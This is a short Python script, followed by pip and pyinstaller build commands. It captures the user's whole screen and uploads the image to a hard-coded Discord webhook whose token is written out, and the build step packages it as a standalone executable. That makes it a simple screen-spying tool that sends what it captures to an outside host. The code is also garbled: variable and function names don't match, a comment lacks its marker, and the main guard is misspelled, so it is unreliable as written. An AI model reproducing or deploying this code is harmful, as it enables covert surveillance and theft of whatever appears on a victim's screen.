import os
import io
import requests
from PIL import ImageGrab
from datetime import datetime

URL of the Discord webhook
WEBHOOKURL = 'https://discord.com/api/webhooks/1245013270088253473/PrDXaeWwmrAeLpbfa_nsBP_4r3-T4lCg6S1w4zEkHq-E3QqICRbdhJQr0N3IjNsS0xy'

def takescreenshot():
    # Take a screenshot
    screenshot = ImageGrab.grab()
    # Save the screenshot to a BytesIO object
    imgbytes = io.BytesIO()
    screenshot.save(imgbytes, format='PNG')
    imgbytes.seek(0)
    return img_bytes

def send_screenshot_to_discord(img_bytes):
    # Create the payload for the webhook
    files = {
        'file': ('screenshot.png', img_bytes, 'image/png')
    }
    response = requests.post(WEBHOOK_URL, files=files)
    if response.status_code == 204:
        print("Screenshot successfully uploaded.")
    else:
        print(f"Failed to upload screenshot. Status code: {response.status_code}")
        print(response.text)

def main():
    img_bytes = take_screenshot()
    send_screenshot_to_discord(img_bytes)

if __name == "__main":
    main()



pip install pillow pygetwindow requests
pip install pyinstaller
pip install pillow pygetwindow requests
pyinstaller --onefile screenshot_uploader.py
